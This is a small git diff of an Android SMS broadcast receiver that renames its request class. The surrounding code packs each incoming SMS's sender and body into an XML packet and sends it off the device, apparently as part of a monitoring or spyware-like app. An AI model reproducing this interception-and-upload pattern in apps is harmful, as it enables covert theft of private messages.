@@ -16,7 +16,7 @@ import android.telephony.SmsMessage;
 import android.util.Log;
 
 import com.inet.android.bs.FileLog;
-import com.inet.android.bs.Request;
+import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.bs.WorkTimeDefiner;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
@@ -27,7 +27,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private Context mContext;
 	private Bundle mBundle;
 	String dir = null;
-	Request req;
+	RequestMakerImpl req;
 
 	public void onReceive(Context context, Intent intent) {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
@@ -108,8 +108,8 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 						+ adress + "</ttl><cdata1>" + bodyText.toString()
 						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
 
-				req = new Request(mContext);
-				req.sendRequest(sendStr);
+				req = new RequestMakerImpl(mContext);
+				req.sendDataRequest(sendStr);
 				Log.d("smsRec", sendStr);
 				FileLog.writeLog("sms: " + sendStr);
 
